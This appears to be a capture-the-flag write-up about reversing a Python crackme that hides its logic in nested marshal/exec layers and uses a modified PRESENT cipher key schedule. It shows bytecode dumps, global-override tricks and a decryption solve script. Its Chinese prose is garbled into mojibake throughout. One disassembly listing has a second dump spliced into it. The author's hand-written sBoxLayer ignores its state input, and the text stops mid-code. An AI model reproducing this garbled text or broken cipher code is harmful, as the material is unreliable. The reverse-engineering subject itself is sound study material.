da\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#x27;)</span><br><span class="line">            210 CALL_METHOD              1</span><br><span class="line">            212 STORE_NAME               7 (co)</span><br><span class="line"></span><br><span class="line"> 12         214 LOAD_NAME                8 (exec)</span><br><span class="line">            216 LOAD_NAME                7 (co)</span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            220 POP_TOP</span><br><span class="line">            222 LOAD_CONST              69 (None)</span><br><span class="line">            224 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7fbf6f8f83a0, file &quot;&quot;, line 4&gt;:</span><br><span class="line">  4           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (Sbox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7fbf6f8f8660, file &quot;&quot;, line 9&gt;:</span><br><span class="line">  9           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (PBox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</details>

<p>æ³¨æ„åˆ°æœ‰å‡ ä¸ªæ˜¾çœ¼ç‰¹å¾:</p>
<ul>
<li>Sbox</li>
<li>PBox</li>
<li>generateRoundkeys80<br>æœç´¢å¯ä»¥å¾—åˆ°:</li>
</ul>
<p><img src="https://s2.loli.net/2023/12/03/QR6G7gCuYtfhc1P.png" alt="B68_Z___PC67M0HVVJ2_DA8.png"></p>
<p>è¯´æ˜æ˜¯presentç®—æ³•<br>é‚£æˆ‘ä»¬æ€ä¹ˆå¾—åˆ°é‚£å‡ ä¸ªå…³é”®å˜é‡çš„å€¼å‘¢ï¼Ÿ<br>è¿™é‡Œè·Ÿç€å®˜æ–¹WPå­¦ä¹ äº†ä¸€æ‰‹å…¨å±€hookçš„æ€æƒ³<br>![&#96;BEPIHG0_C8_CY_@7@6~1L1.png](<a href="https://s2.loli.net/2023/12/03/4wQCeFy9LIT2jms.png">https://s2.loli.net/2023/12/03/4wQCeFy9LIT2jms.png</a>)<br>ä½†æ˜¯å®é™…ç”¨çš„æ—¶å€™ä¼šå‘ç° åœ¨execåç”¨çš„è¯ ç¨‹åºä¼šç›´æ¥é€€å‡º(è°ƒç”¨äº†exit())<br><img src="https://s2.loli.net/2023/12/03/GPh2KRF5AdOcoBj.png" alt="O_DK_VOF3HP@PW0_O@RGN1Q.png"><br>è€Œæˆ‘ä»¬åœ¨execæ‰§è¡Œå‰å®šä¹‰ä¸€ä¸ªexit ç›¸å½“äºæŠŠç³»ç»Ÿçš„exitç»™è¦†ç›–æ‰ (åˆ©ç”¨å…¨å±€ç‰¹æ€§ ç±»ä¼¼web get&#x2F;postä¿®æ”¹å…¨å±€å˜é‡)<br>ä½†æ˜¯è¿™æ ·è¿è¡Œè¿˜æ˜¯æŠ¥é”™ æˆ‘ä»¬å†åŠ ä¸ªtry exceptå—æ¥ä¿è¯èƒ½å¾—åˆ°globals()<br><img src="https://s2.loli.net/2023/12/03/6zMsQ3kjYfnLX52.png" alt="HY65JZD_HH__3_U6_X1YF@L.png"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™æ—¶å·²ç»èƒ½å¾—åˆ°ä¸€äº›å…³é”®å€¼äº†<br>æ€»ç»“ä¸€ä¸‹ : ç°åœ¨å¾—åˆ°äº†</p>
<ul>
<li>sbox</li>
<li>sbox_inv</li>
<li>pbox</li>
<li>pbox_inv</li>
<li>cmps</li>
</ul>
<p>å‘ç°è¿™é‡Œè¿˜å°‘äº† keyçš„å€¼<br>è¯´æ˜keyä¸åœ¨globalsé‡Œ è¿™é‡Œå†æ¬¡åˆ©ç”¨å…¨å±€hookçš„æŠ€å·§<br>keyåœ¨<code>generateRoundkeys80</code>ä¸­è¢«è°ƒç”¨</p>
<p><img src="https://s2.loli.net/2023/12/03/1iHt5M7uEXzVw4A.png" alt="img"></p>
<p>æ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹generateRoundkeys80 ä½¿å®ƒè¾“å‡ºä¼ å…¥çš„ä¸¤ä¸ªå˜é‡çš„å€¼å³å¯(ä½¿ç”¨lambda <del>pythoné«˜çº§ç‰¹å¾å­¦åˆ°äº†</del>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generateRoundkeys80 = <span class="keyword">lambda</span> x1,x2: <span class="built_in">print</span>(x1,x2)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/03/lEFAxXu9cnajroK.png" alt="_G0380___9__SM1E_1O~LD0.png"><br>è¿™å°±å¾—åˆ°äº†key!<br>ä½†æ˜¯ç›´æ¥å¥—ä¼šå‘ç°è§£å‡ºæ¥ä¸å¯¹â€¦<br>é‚£å°±åªèƒ½çœ‹å­—èŠ‚ç  æ‰‹åŠ¨è„±marshal(5,6æ¬¡å§)<br>å¾—åˆ°å…³é”®çš„generatekey80çš„å­—èŠ‚ç (æœ€åä¸€å±‚æ‰è„±å‡ºæ¥ è¯´æ˜å…³é”®åº”è¯¥åœ¨è¿™é‡Œ)</p>
<details>
<summary>ç‚¹å‡»æŸ¥çœ‹ä»£ç </summary>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  2           0 LOAD_CONST               0 (&lt;code object generateRoundkeys80 at 0x7fb5577493a0, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;generateRoundkeys80&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (generateRoundkeys80)</span><br><span class="line"></span><br><span class="line"> 11           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">             12 LOAD_CONST                 2           0 LOAD_CONST               0 (&lt;code object encrypt at 0x7f7a22c7c660, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;encrypt&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (encrypt)</span><br><span class="line"></span><br><span class="line"> 16           8 LOAD_NAME                1 (input)</span><br><span class="line">             10 LOAD_CONST               2 (&#x27;pls input ur flag:&#x27;)</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             14 STORE_NAME               2 (inp)</span><br><span class="line"></span><br><span class="line"> 17          16 LOAD_NAME                3 (len)</span><br><span class="line">             18 LOAD_NAME                2 (inp)</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 LOAD_CONST               3 (32)</span><br><span class="line">             24 COMPARE_OP               3 (!=)</span><br><span class="line">             26 POP_JUMP_IF_FALSE       44</span><br><span class="line"></span><br><span class="line"> 18          28 LOAD_NAME                4 (print)</span><br><span class="line">             30 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">             32 CALL_FUNCTION            1</span><br><span class="line">             34 POP_TOP</span><br><span class="line"></span><br><span class="line"> 19          36 LOAD_NAME                5 (exit)</span><br><span class="line">             38 LOAD_CONST               5 (0)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 POP_TOP</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;   44 LOAD_NAME                2 (inp)</span><br><span class="line">             46 LOAD_CONST               6 (None)</span><br><span class="line">             48 LOAD_CONST               7 (8)</span><br><span class="line">             50 BUILD_SLICE              2</span><br><span class="line">             52 BINARY_SUBSCR</span><br><span class="line">             54 LOAD_NAME                2 (inp)</span><br><span class="line">             56 LOAD_CONST               7 (8)</span><br><span class="line">             58 LOAD_CONST               8 (16)</span><br><span class="line">             60 BUILD_SLICE              2</span><br><span class="line">             62 BINARY_SUBSCR</span><br><span class="line">             64 LOAD_NAME                2 (inp)</span><br><span class="line">             66 LOAD_CONST               8 (16)</span><br><span class="line">             68 LOAD_CONST               9 (24)</span><br><span class="line">             70 BUILD_SLICE              2</span><br><span class="line">             72 BINARY_SUBSCR</span><br><span class="line">             74 LOAD_NAME                2 (inp)</span><br><span class="line">             76 LOAD_CONST               9 (24)</span><br><span class="line">             78 LOAD_CONST               3 (32)</span><br><span class="line">             80 BUILD_SLICE              2</span><br><span class="line">             82 BINARY_SUBSCR</span><br><span class="line">             84 BUILD_LIST               4</span><br><span class="line">             86 STORE_NAME               6 (blocks)</span><br><span class="line"></span><br><span class="line"> 21          88 LOAD_CONST              10 (120617461261311902)</span><br><span class="line">             90 LOAD_CONST              11 (16357837616839286114)</span><br><span class="line">             92 LOAD_CONST              12 (312508749794633008)</span><br><span class="line">             94 LOAD_CONST              13 (1843701600916795272)</span><br><span class="line">             96 BUILD_LIST               4</span><br><span class="line">             98 STORE_NAME               7 (cmps)</span><br><span class="line"></span><br><span class="line"> 22         100 LOAD_NAME                0 (encrypt)</span><br><span class="line">            102 LOAD_NAME                6 (blocks)</span><br><span class="line">            104 CALL_FUNCTION            1</span><br><span class="line">            106 STORE_NAME               8 (out_blocks)</span><br><span class="line"></span><br><span class="line"> 23         108 LOAD_NAME                9 (range)</span><br><span class="line">            110 LOAD_CONST              14 (4)</span><br><span class="line">            112 CALL_FUNCTION            1</span><br><span class="line">            114 GET_ITER</span><br><span class="line">        &gt;&gt;  116 FOR_ITER                36 (to 154)</span><br><span class="line">            118 STORE_NAME              10 (i)</span><br><span class="line"></span><br><span class="line"> 24         120 LOAD_NAME                7 (cmps)</span><br><span class="line">            122 LOAD_NAME               10 (i)</span><br><span class="line">            124 BINARY_SUBSCR</span><br><span class="line">            126 LOAD_NAME                8 (out_blocks)</span><br><span class="line">            128 LOAD_NAME               10 (i)</span><br><span class="line">            130 BINARY_SUBSCR</span><br><span class="line">            132 COMPARE_OP               3 (!=)</span><br><span class="line">            134 POP_JUMP_IF_FALSE      116</span><br><span class="line"></span><br><span class="line"> 25         136 LOAD_NAME                4 (print)</span><br><span class="line">            138 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">            140 CALL_FUNCTION            1</span><br><span class="line">            142 POP_TOP</span><br><span class="line"></span><br><span class="line"> 26         144 LOAD_NAME                5 (exit)</span><br><span class="line">            146 LOAD_CONST               5 (0)</span><br><span class="line">            148 CALL_FUNCTION            1</span><br><span class="line">            150 POP_TOP</span><br><span class="line">            152 JUMP_ABSOLUTE          116</span><br><span class="line"></span><br><span class="line"> 27     &gt;&gt;  154 LOAD_NAME                4 (print)</span><br><span class="line">            156 LOAD_CONST              15 (&#x27;Correct!&#x27;)</span><br><span class="line">            158 CALL_FUNCTION            1</span><br><span class="line">            160 POP_TOP</span><br><span class="line">            162 LOAD_CONST               6 (None)</span><br><span class="line">            164 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object encrypt at 0x7f7a22c7c660, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (32)</span><br><span class="line">              2 STORE_FAST               1 (rounds)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (generateRoundkeys80)</span><br><span class="line">              6 LOAD_CONST               2 (85354531916197809168417)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 CALL_FUNCTION            2</span><br><span class="line">             12 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  5          14 BUILD_LIST               0</span><br><span class="line">             16 STORE_FAST               3 (out)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_FAST                0 (blocks)</span><br><span class="line">             20 GET_ITER</span><br><span class="line">        &gt;&gt;   22 FOR_ITER                84 (to 108)</span><br><span class="line">             24 STORE_FAST               4 (block)</span><br><span class="line"></span><br><span class="line">  7          26 LOAD_GLOBAL              1 (string2number)</span><br><span class="line">             28 LOAD_FAST                4 (block)</span><br><span class="line">             30 CALL_FUNCTION            1</span><br><span class="line">             32 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line">  8          34 LOAD_GLOBAL              2 (range)</span><br><span class="line">             36 LOAD_FAST                1 (rounds)</span><br><span class="line">             38 LOAD_CONST               3 (1)</span><br><span class="line">             40 BINARY_SUBTRACT</span><br><span class="line">             42 CALL_FUNCTION            1</span><br><span class="line">             44 GET_ITER</span><br><span class="line">        &gt;&gt;   46 FOR_ITER                34 (to 82)</span><br><span class="line">             48 STORE_FAST               6 (i)</span><br><span class="line"></span><br><span class="line">  9          50 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             52 LOAD_FAST                5 (state)</span><br><span class="line">             54 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             56 LOAD_FAST                6 (i)</span><br><span class="line">             58 BINARY_SUBSCR</span><br><span class="line">             60 CALL_FUNCTION            2</span><br><span class="line">             62 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 10          64 LOAD_GLOBAL              4 (sBoxLayer)</span><br><span class="line">             66 LOAD_FAST                5 (state)</span><br><span class="line">             68 CALL_FUNCTION            1</span><br><span class="line">             70 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 11          72 LOAD_GLOBAL              5 (pLayer)</span><br><span class="line">             74 LOAD_FAST                5 (state)</span><br><span class="line">             76 CALL_FUNCTION            1</span><br><span class="line">             78 STORE_FAST               5 (state)</span><br><span class="line">             80 JUMP_ABSOLUTE           46</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;   82 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             84 LOAD_FAST                5 (state)</span><br><span class="line">             86 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             88 LOAD_CONST               4 (-1)</span><br><span class="line">             90 BINARY_SUBSCR</span><br><span class="line">             92 CALL_FUNCTION            2</span><br><span class="line">             94 STORE_FAST               7 (cipher)</span><br><span class="line"></span><br><span class="line"> 13          96 LOAD_FAST                3 (out)</span><br><span class="line">             98 LOAD_METHOD              6 (append)</span><br><span class="line">            100 LOAD_FAST                7 (cipher)</span><br><span class="line">            102 CALL_METHOD              1</span><br><span class="line">            104 POP_TOP</span><br><span class="line">            106 JUMP_ABSOLUTE           22</span><br><span class="line"></span><br><span class="line"> 14     &gt;&gt;  108 LOAD_FAST                3 (out)</span><br><span class="line">            110 RETURN_VALUE</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line"> 12          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object generateRoundkeys80 at 0x7fb5577493a0, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               1 (1)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 LOAD_CONST               1 (1)</span><br><span class="line">             12 BINARY_ADD</span><br><span class="line">             14 LOAD_CONST               1 (1)</span><br><span class="line">             16 CALL_FUNCTION            3</span><br><span class="line">             18 GET_ITER</span><br><span class="line">        &gt;&gt;   20 FOR_ITER                90 (to 112)</span><br><span class="line">             22 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             26 LOAD_METHOD              1 (append)</span><br><span class="line">             28 LOAD_FAST                0 (key)</span><br><span class="line">             30 LOAD_CONST               2 (16)</span><br><span class="line">             32 BINARY_RSHIFT</span><br><span class="line">             34 CALL_METHOD              1</span><br><span class="line">             36 POP_TOP</span><br><span class="line"></span><br><span class="line">  6          38 LOAD_FAST                0 (key)</span><br><span class="line">             40 LOAD_CONST               3 (524287)</span><br><span class="line">             42 BINARY_AND</span><br><span class="line">             44 LOAD_CONST               4 (61)</span><br><span class="line">             46 BINARY_LSHIFT</span><br><span class="line">             48 LOAD_FAST                0 (key)</span><br><span class="line">             50 LOAD_CONST               5 (19)</span><br><span class="line">             52 BINARY_RSHIFT</span><br><span class="line">             54 BINARY_ADD</span><br><span class="line">             56 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  7          58 LOAD_GLOBAL              2 (Sbox)</span><br><span class="line">             60 LOAD_FAST                0 (key)</span><br><span class="line">             62 LOAD_CONST               6 (76)</span><br><span class="line">             64 BINARY_RSHIFT</span><br><span class="line">             66 BINARY_SUBSCR</span><br><span class="line">             68 LOAD_CONST               6 (76)</span><br><span class="line">             70 BINARY_LSHIFT</span><br><span class="line">             72 LOAD_FAST                0 (key)</span><br><span class="line">             74 LOAD_CONST               7 (2)</span><br><span class="line">             76 LOAD_CONST               6 (76)</span><br><span class="line">             78 BINARY_POWER</span><br><span class="line">             80 LOAD_CONST               1 (1)</span><br><span class="line">             82 BINARY_SUBTRACT</span><br><span class="line">             84 BINARY_AND</span><br><span class="line">             86 BINARY_ADD</span><br><span class="line">             88 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  8          90 LOAD_FAST                0 (key)</span><br><span class="line">             92 LOAD_FAST                3 (i)</span><br><span class="line">             94 LOAD_CONST               8 (15)</span><br><span class="line">             96 BINARY_LSHIFT</span><br><span class="line">             98 LOAD_FAST                0 (key)</span><br><span class="line">            100 LOAD_CONST               5 (19)</span><br><span class="line">            102 BINARY_RSHIFT</span><br><span class="line">            104 BINARY_XOR</span><br><span class="line">            106 INPLACE_XOR</span><br><span class="line">            108 STORE_FAST               0 (key)</span><br><span class="line">            110 JUMP_ABSOLUTE           20</span><br><span class="line"></span><br><span class="line">  9     &gt;&gt;  112 LOAD_FAST                2 (roundkeys)</span><br><span class="line">            114 RETURN_VALUE</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</details>

<p><img src="https://s2.loli.net/2023/12/03/IOML12SXx45RyFU.png" alt="img"></p>
<p>è¿™é‡Œä¹Ÿèƒ½è§£é‡Šä¸ºä»€ä¹ˆå‰é¢å…¨å±€hookåè°ƒç”¨encrypt(xxx)<br>ç»“åˆæ ‡å‡†roundkeysç”Ÿæˆç®—æ³•<br><img src="https://s2.loli.net/2023/12/03/Rusgx94JzwmIdvU.png" alt="img"></p>
<p>å†å¯¹æ¯”å­—èŠ‚ç (é€šè¿‡ç‰¹å¾å‚æ•°å®šä½)<br><img src="https://s2.loli.net/2023/12/03/OEBXFZSzy8VUcGt.png" alt="img"><br>å¯ä»¥å‘ç°åœ¨ <code>key ^= i &lt;&lt; 15</code> çš„åŸºç¡€ä¸Šå˜æˆäº†<br><code>key ^= (i&lt;&lt;15) ^ (key &gt;&gt; 19)</code><br>æ‰€ä»¥åœ¨æ ‡å‡†ä»£ç ä¸Šç¨ä½œä¿®æ”¹:(ç›´æ¥æ¬å®˜æ–¹çš„äº† åº”è¯¥æ˜¯å¯¹ç€å­—èŠ‚ç å†™çš„å§ ç½‘ä¸Šæ‰¾çš„éƒ½ä¸å¥½ç›´æ¥æ”¹ <del>è¿˜ä¸å¦‚è‡ªå·±æ‰‹æ“å­—èŠ‚ç </del>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            output += Sbox_inv[( state &gt;&gt; (i*<span class="number">4</span>)) &amp; <span class="number">0xF</span>] &lt;&lt; (i*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            output += ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key,rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,rounds+<span class="number">1</span>,<span class="number">1</span>): </span><br><span class="line">            roundkeys.append(key &gt;&gt;<span class="number">16</span>)</span><br><span class="line">            key = ((key &amp; (<span class="number">2</span>**<span class="number">19</span>-<span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">            key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>)+(key &amp; (<span class="number">2</span>**<span class="number">76</span>-<span class="number">1</span>))</span><br><span class="line">            key ^= (i &lt;&lt; <span class="number">15</span>)^(key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(i[c])&lt;&lt;(<span class="number">8</span>*c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#        0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f</span></span><br><span class="line">Sbox= [<span class="number">0xc</span>,<span class="number">0x5</span>,<span class="number">0x6</span>,<span class="number">0xb</span>,<span class="number">0x9</span>,<span class="number">0x0</span>,<span class="number">0xa</span>,<span class="number">0xd</span>,<span class="number">0x3</span>,<span class="number">0xe</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x4</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x2</span>]</span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">PBox = [<span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,</span><br><span class="line">        <span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,</span><br><span class="line">        <span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,</span><br><span class="line">        <span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span>]</span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state,roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">blocks</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = block</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds-<span class="number">1</span>):</span><br><span class="line">                state = addRoundKey(state, roundkeys[-i-<span class="number">1</span>])</span><br><span class="line">                state = pLayer_dec(state)</span><br><span class="line">                state = sBoxLayer_dec(state)</span><br><span class="line">        decipher = addRoundKey(state, roundkeys[<span class="number">0</span>])</span><br><span class="line">        flag += <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(decipher&gt;&gt;(c*<span class="number">8</span>) &amp; <span class="number">0xff</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line">decrypt(cmps)</span><br><span class="line"><span class="comment"># 83ab766012aef9934c95ed93e9822a91</span></span><br></pre></td></tr></table></figure>

<p>æƒ³äº†æƒ³è¿˜æ˜¯è‡ªå·±æ‰‹æ“ä¸€ä¸‹(ç»ƒä¹ ä¸‹å­—èŠ‚ç ) æŠŠåŠ å¯†ä»£ç å†™äº†ä¸‹:<br>è¿˜å¤ä¹ äº†å‡ ä¸ªç‚¹:</p>
<ul>
<li>INPLACE_ADD: output +&#x3D;</li>
<li>BINARY_SUBSCR ç”¨æ¥åˆ’åˆ†å— é¿å…å­—èŠ‚ç äº§ç”Ÿæ­§ä¹‰</li>
</ul>
<p>è‡ªå·±å†™çš„æ—¶å€™ å‘ç°string2numberç›´æ¥çœ‹å­—èŠ‚ç æ˜¯ä¸å¤ªèƒ½å†™å‡ºæ¥çš„ ä½†çŸ¥é“åŸç†è‡ªå·±å†™ä¸€ä¸‹ä¹Ÿå·®ä¸äº†å¤šå°‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    generateRoundkeys80(<span class="number">85354531916197809168417</span>,rounds)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = string2number(block)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds-<span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state,roundkeys[i]) <span class="comment"># roundkeysæ˜¯æ•°ç»„</span></span><br><span class="line">            state = sBoxLayer(state)</span><br><span class="line">            state = pLayer(state)</span><br><span class="line">        cipher = addRoundKey(state,roundkeys[-<span class="number">1</span>])</span><br><span class="line">        out.append(cipher)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state,roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state^roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(i[c])&lt;&lt;(<span class="number">8</span>*c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox[(<span class="number">4</span>*i&gt;&gt;<span class="number">15</span>)&amp;<span class="number">15</span>]&lt;&lt;(<span class="number">4</span>*i)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span 